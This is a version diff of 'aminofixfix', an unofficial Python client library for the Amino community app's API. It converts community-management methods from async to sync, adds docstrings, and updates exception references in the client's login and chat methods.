                 "identity": email
             },
             "deviceID": self.device_id
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/g/s-x{self.comId}/community/delete-request", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/g/s-x{self.comId}/community/delete-request", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def list_communities(self, start: int = 0, size: int = 25):
-        response = await self.session.get(f"/g/s/community/managed?start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+    def list_communities(self, start: int = 0, size: int = 25):
+        """
+        Getting all communities where you are leader.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `dict`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+        response = self.session.get(f"/g/s/community/managed?start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.CommunityList(loads(response.text)["communityList"]).CommunityList
 
-    async def get_categories(self, start: int = 0, size: int = 25):
+    def get_categories(self, start: int = 0, size: int = 25):
+        """
+        Getting categories of communities.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `dict`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.get(f"/x{self.comId}/s/blog-category?start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+        response = self.session.get(f"/x{self.comId}/s/blog-category?start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return loads(response.text)
 
-    async def change_sidepanel_color(self, color: str):
+    def change_sidepanel_color(self, color: str):
+        """
+        Change sidepanel color.
+
+        Accepting:
+        - color: str
+            - should be hex color like "#123ABC"
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "path": "appearance.leftSidePanel.style.iconColor",
-            "value": color,
+            "value": color if len(color) == 7 else "#000000",
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return response.status_code
         else: return loads(response.text)
 
-    async def get_themepack_info(self, file: BinaryIO):
+    def get_themepack_info(self):
         """
         This method can be used for getting info about current themepack of community.
+
+        Recieving:
+        - object
+        - on exception, some exception from `aminofixfix.lib.exceptions`
         """
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.get(f"/g/s-x{self.comId}/community/info?withTopicList=1&withInfluencerList=1&influencerListOrderStrategy=fansCount", data=file.read(), headers=headers.Headers(data=file.read()).s_headers, proxies=self.proxies)
+        response = self.session.get(f"/g/s-x{self.comId}/community/info?withTopicList=1&withInfluencerList=1&influencerListOrderStrategy=fansCount", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
-        else: return await response.json()['community']['themePack']
-
-    async def upload_themepack_raw(self, file: BinaryIO):
+        else: return response.json()['community']['themePack']
+    
+    def upload_themepack_raw(self, file: BinaryIO):
         """
         Uploading new themepack.
 
         File is technically a ZIP file, but you should rename .zip to .ndthemepack.
         Also this "zip" file have specific stucture.
 
         The structure is:
@@ -153,115 +261,275 @@
                 - w = 375
                 - h = 667
             - "titlebar-image":
                 - w = 320
                 - h = 64
         - you *can* specify "x" and "y" if you want
         - theoretically you can provide different "w" and "h"
+
+        Accepting:
+        - file: BinaryIO
+
+        Recieving:
+        - object
+        - on exception, some exception from `aminofixfix.lib.exceptions`
         """
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/media/upload/target/community-theme-pack", data=file.read(), headers=headers.Headers(data=file.read()).s_headers, proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/media/upload/target/community-theme-pack", data=file.read(), headers=headers.Headers(data=file.read()).s_headers, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return loads(response.text)
 
-    async def promote(self, userId: str, rank: str):
+    def promote(self, userId: str, rank: str):
+        """
+        Promote user to curator, leader or agent.
+
+        Accepting:
+        - userId: str
+        - rank: str
+            - can be only "agent"/"transfer-agent", "leader" or "curator"
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         rank = rank.lower().replace("agent", "transfer-agent")
 
         if rank.lower() not in ["transfer-agent", "leader", "curator"]:
             raise exceptions.WrongType(rank)
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/user-profile/{userId}/{rank}", headers=self.parse_headers(), proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/{rank}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def get_join_requests(self, start: int = 0, size: int = 25):
+    def get_join_requests(self, start: int = 0, size: int = 25):
+        """
+        Get all requests to join your precious community.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `JoinRequest`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if self.comId is None: raise exceptions.CommunityNeeded()
 
-        response = await self.session.get(f"/x{self.comId}/s/community/membership-request?status=pending&start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+        response = self.session.get(f"/x{self.comId}/s/community/membership-request?status=pending&start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.JoinRequest(loads(response.text)).JoinRequest
 
-    async def accept_join_request(self, userId: str):
+    def accept_join_request(self, userId: str):
+        """
+        Accept user to join your precious community.
+
+        "Congratulations!
+
+        Your REQUEST TO JOIN has been approved."
+
+        https://www.youtube.com/watch?v=LabIat9t-uY
+
+        Accepting:
+        - userId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({})
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/community/membership-request/{userId}/accept", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/community/membership-request/{userId}/accept", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def reject_join_request(self, userId: str):
+    def reject_join_request(self, userId: str):
+        """
+        Reject user to join your precious community.
+
+        "Congratulations!
+
+        Your REQUEST TO JOIN has been denied.
+
+        Don't even bother trying again."
+
+        https://www.youtube.com/watch?v=3vH6GBbeAgA
+
+        Accepting:
+        - userId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({})
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/community/membership-request/{userId}/reject", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/community/membership-request/{userId}/reject", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def get_community_stats(self):
+    def get_community_stats(self):
+        """
+        Get community statistics.
+
+        Recieving:
+        - object `CommunityStats`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if self.comId is None: raise exceptions.CommunityNeeded()
 
-        response = await self.session.get(f"/x{self.comId}/s/community/stats", headers=self.parse_headers(), proxies=self.proxies)
+        response = self.session.get(f"/x{self.comId}/s/community/stats", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.CommunityStats(loads(response.text)["communityStats"]).CommunityStats
 
-    async def get_community_user_stats(self, type: str, start: int = 0, size: int = 25):
+    def get_community_user_stats(self, type: str, start: int = 0, size: int = 25):
+        """
+        Get community user statistics.
+
+        Accepting:
+        - type: str
+            - can be only "leader" or "curator"
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `UserProfileList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if self.comId is None: raise exceptions.CommunityNeeded()
 
         if type.lower() == "leader": target = "leader"
         elif type.lower() == "curator": target = "curator"
         else: raise exceptions.WrongType(type)
 
-        response = await self.session.get(f"/x{self.comId}/s/community/stats/moderation?type={target}&start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+        response = self.session.get(f"/x{self.comId}/s/community/stats/moderation?type={target}&start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.UserProfileList(loads(response.text)["userProfileList"]).UserProfileList
 
-    async def change_welcome_message(self, message: str, isEnabled: bool = True):
+    def change_welcome_message(self, message: str, isEnabled: bool = True):
+        """
+        Change welcome message of community.
+
+        Accepting:
+        - message: str
+        - isEnabled: bool = True
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "path": "general.welcomeMessage",
             "value": {
                 "enabled": isEnabled,
                 "text": message
             },
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def change_guidelines(self, message: str):
+    def change_amino_id(self, aminoId: str):
+        """
+        Change AminoID of community.
+
+        Accepting:
+        - aminoId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+        data = dumps({
+            "endpoint": aminoId,
+            "timestamp": int(timestamp() * 1000)
+        })
+
+        if self.comId is None: raise exceptions.CommunityNeeded()
+        response = self.session.post(f"/x{self.comId}/s/community/settings", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
+        if response.status_code != 200: return exceptions.CheckException(response)
+        else: return response.status_code
+
+    def change_guidelines(self, message: str):
+        """
+        Change rules of community.
+
+        Accepting:
+        - message: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "content": message,
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/community/guideline", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/community/guideline", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def edit_community(self, name: str = None, description: str = None, aminoId: str = None, primaryLanguage: str = None, themePackUrl: str = None):
+    def edit_community(self, name: str = None, description: str = None, aminoId: str = None, primaryLanguage: str = None, themePackUrl: str = None):
+        """
+        Edit community.
+
+        Accepting:
+        - name: str = None
+        - description: str = None
+        - aminoId: str = None
+        - primaryLanguage: str = None
+        - themePackUrl: str = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+        
         data = {"timestamp": int(timestamp() * 1000)}
 
         if name is not None: data["name"] = name
         if description is not None: data["content"] = description
         if aminoId is not None: data["endpoint"] = aminoId
         if primaryLanguage is not None: data["primaryLanguage"] = primaryLanguage
         if themePackUrl is not None: data["themePackUrl"] = themePackUrl
 
         data = dumps(data)
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/community/settings", data=data, headers=self.parse_headers(data=data), proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/community/settings", data=data, headers=self.additional_headers(data=data), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def change_module(self, module: str, isEnabled: bool):
+    def change_module(self, module: str, isEnabled: bool):
+        """
+        Enable or disable module.
+
+        Accepting:
+        - module: str
+            - can be only "chat", "livechat", "screeningroom", "publicchats", "posts",
+              "ranking", "leaderboards", "featured", "featuredposts", "featuredusers",
+              "featuredchats", "sharedfolder", "influencer", "catalog",
+              "externalcontent" or "topiccategories"
+        - isEnabled: bool
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if module.lower() == "chat": mod = "module.chat.enabled"
         elif module.lower() == "livechat": mod = "module.chat.avChat.videoEnabled"
         elif module.lower() == "screeningroom": mod = "module.chat.avChat.screeningRoomEnabled"
         elif module.lower() == "publicchats": mod = "module.chat.publicChat.enabled"
         elif module.lower() == "posts": mod = "module.post.enabled"
         elif module.lower() == "ranking": mod = "module.ranking.enabled"
         elif module.lower() == "leaderboards": mod = "module.ranking.leaderboardEnabled"
@@ -279,39 +547,84 @@
         data = dumps({
             "path": mod,
             "value": isEnabled,
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def add_influencer(self, userId: str, monthlyFee: int):
+    def add_influencer(self, userId: str, monthlyFee: int):
+        """
+        Create fanclub.
+
+        Accepting:
+        - userId: str
+        - monthlyFee: int
+            - can be maximum 500 coins per month
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "monthlyFee": monthlyFee,
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.post(f"/x{self.comId}/s/influencer/{userId}", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/x{self.comId}/s/influencer/{userId}", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def remove_influencer(self, userId: str):
+    def remove_influencer(self, userId: str):
+        """
+        Delete fanclub.
+
+        Accepting:
+        - userId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.delete(f"/x{self.comId}/s/influencer/{userId}", headers=self.parse_headers(), proxies=self.proxies)
+        response = self.session.delete(f"/x{self.comId}/s/influencer/{userId}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def get_notice_list(self, start: int = 0, size: int = 25):
+    def get_notice_list(self, start: int = 0, size: int = 25):
+        """
+        Get notices list.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `NoticeList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.get(f"/x{self.comId}/s/notice?type=management&status=1&start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+        response = self.session.get(f"/x{self.comId}/s/notice?type=management&status=1&start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.NoticeList(loads(response.text)["noticeList"]).NoticeList
 
-    async def delete_pending_role(self, noticeId: str):
+    def delete_pending_role(self, noticeId: str):
+        """
+        Delete pending role.
+
+        Accepting:
+        - noticeId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = await self.session.delete(f"/x{self.comId}/s/notice/{noticeId}", headers=self.parse_headers(), proxies=self.proxies)
+        response = self.session.delete(f"/x{self.comId}/s/notice/{noticeId}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
```

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/client.py` & `amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/client.py`

 * *Files 3% similar despite different names*

```diff
@@ -262,15 +262,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **password** : Password of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "email": email,
             "v": 2,
             "secret": f"0 {password}",
             "deviceID": self.device_id,
@@ -302,15 +302,15 @@
         **Parameters**
             - **phoneNumber** : Phone number of the account.
             - **password** : Password of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "phoneNumber": phoneNumber,
             "v": 2,
             "secret": f"0 {password}",
             "deviceID": self.device_id,
             "clientType": 300,
@@ -343,15 +343,15 @@
 
         **Parameters**
             - **secret** : Secret of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "v": 2,
             "secret": secret,
             "deviceID": self.device_id,
             "clientType": 100,
             "action": "normal",
@@ -386,15 +386,15 @@
             - **password** : Password of the account.
             - **verificationCode** : Verification code.
             - **deviceId** : The device id being registered to.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         if deviceId == None: deviceId = self.device_id
 
         data = dumps({
             "secret": f"0 {password}",
             "deviceID": deviceId,
@@ -430,15 +430,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **password** : Password of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "secret": f"0 {password}",
             "deviceID": self.device_id,
             "email": email,
             "timestamp": int(timestamp() * 1000)
         })
@@ -455,15 +455,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "deviceID": self.device_id,
             "clientType": 100,
             "timestamp": int(timestamp() * 1000)
         })
 
@@ -492,15 +492,15 @@
             - **age** : Age of the account. Minimum is 13.
             - **gender** : Gender of the account.
                 - ``Male``, ``Female`` or ``Non-Binary``
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if gender.lower() == "male": gender = 1
         elif gender.lower() == "female": gender = 2
         elif gender.lower() == "non-binary": gender = 255
         else: raise exceptions.SpecifyType()
 
         if age <= 12: raise exceptions.AgeTooLow()
@@ -524,15 +524,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **code** : Verification code.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "validationContext": {
                 "type": 1,
                 "identity": email,
                 "data": {"code": code}},
             "deviceID": self.device_id,
@@ -552,15 +552,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **resetPassword** : If the code should be for Password Reset.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "identity": email,
             "type": 1,
             "deviceID": self.device_id
         }
 
@@ -582,15 +582,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **code** : Verification code.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "type": 1,
             "identity": email,
             "data": {"code": code},
             "deviceID": self.device_id
@@ -609,15 +609,15 @@
 
         **Parameters**
             - **password** : Password of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "deviceID": self.device_id,
             "secret": f"0 {password}"
         })
 
@@ -635,15 +635,15 @@
             - **email** : Email of the account.
             - **password** : Password of the account.
             - **code** : Verification code.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "updateSecret": f"0 {password}",
             "emailValidationContext": {
                 "data": {
                     "code": code
@@ -669,15 +669,15 @@
 
         **Parameters**
             - **deviceId** : ID of the Device.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "deviceID": deviceId,
             "bundleID": "com.narvii.amino.master",
             "clientType": 100,
             "timezone": -timezone // 1000,
             "systemPushEnabled": True,
@@ -704,15 +704,15 @@
 
         **Parameters**
             - **file** : File to be uploaded.
 
         **Returns**
             - **Success** : Url of the file uploaded to the server.
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if fileType == "audio":
             t = "audio/aac"
         elif fileType == "image":
             t = "image/jpg"
         else: raise exceptions.SpecifyType(fileType)
 
@@ -741,15 +741,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if not self.authenticated: raise exceptions.NotLoggedIn()
         response = await self.session.get(f"/g/s/community/joined?v=1&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.CommunityList(response.json()["communityList"]).CommunityList
@@ -768,15 +768,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : :meth:`User Object <amino.lib.util.objects.UserProfile>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/user-profile/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfile(response.json()["userProfile"]).UserProfile
 
@@ -793,15 +793,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Chat List <amino.lib.util.objects.ThreadList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/chat/thread?type=joined-me&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.ThreadList(response.json()["threadList"]).ThreadList
 
@@ -811,15 +811,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : :meth:`Chat Object <amino.lib.util.objects.Thread>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/chat/thread/{chatId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.Thread(response.json()["thread"]).Thread
 
@@ -836,15 +836,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.post(f"/g/s/chat/thread/{chatId}/member/{self.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -854,15 +854,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.delete(f"/g/s/chat/thread/{chatId}/member/{self.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -877,15 +877,15 @@
             - **content** : Content of Group Chat.
             - **isGlobal** : If Group Chat is Global.
             - **publishToGlobal** : If Group Chat should show in Global.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if isinstance(userId, str): userIds = [userId]
         elif isinstance(userId, list): userIds = userId
         else: raise exceptions.WrongType()
 
         data = {
             "title": title,
@@ -917,15 +917,15 @@
         **Parameters**
             - **userId** : ID of the User or List of User IDs.
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if isinstance(userId, str): userIds = [userId]
         elif isinstance(userId, list): userIds = userId
         else: raise exceptions.WrongType
 
         data = dumps({
             "uids": userIds,
@@ -956,15 +956,15 @@
             - *size* : Size of the list.
             - *size* : Size of the list.
             - *pageToken* : Next Page Token.
 
         **Returns**
             - **Success** : :meth:`Message List <amino.lib.util.objects.MessageList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if pageToken is not None: url = f"/g/s/chat/thread/{chatId}/message?v=2&pagingType=t&pageToken={pageToken}&size={size}"
         else: url = f"/g/s/chat/thread/{chatId}/message?v=2&pagingType=t&size={size}"
 
         response = await self.session.get(url, headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
@@ -978,15 +978,15 @@
         **Parameters**
             - **chatId** : ID of the Chat.
             - **messageId** : ID of the Message.
 
         **Returns**
             - **Success** : :meth:`Message Object <amino.lib.util.objects.Message>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/chat/thread/{chatId}/message/{messageId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.Message(response.json()["message"]).Message
 
@@ -996,15 +996,15 @@
 
         **Parameters**
             - **comId** : ID of the Community.
 
         **Returns**
             - **Success** : :meth:`Community Object <amino.lib.util.objects.Community>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s-x{comId}/community/info?withInfluencerList=1&withTopicList=true&influencerListOrderStrategy=fansCount", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.Community(response.json()["community"]).Community
 
@@ -1014,15 +1014,15 @@
 
         **Parameters**
             - **aminoId** : Amino ID of the Community.
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/search/amino-id-and-link?q={aminoId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
 
             response = response.json()["resultList"]
@@ -1037,15 +1037,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
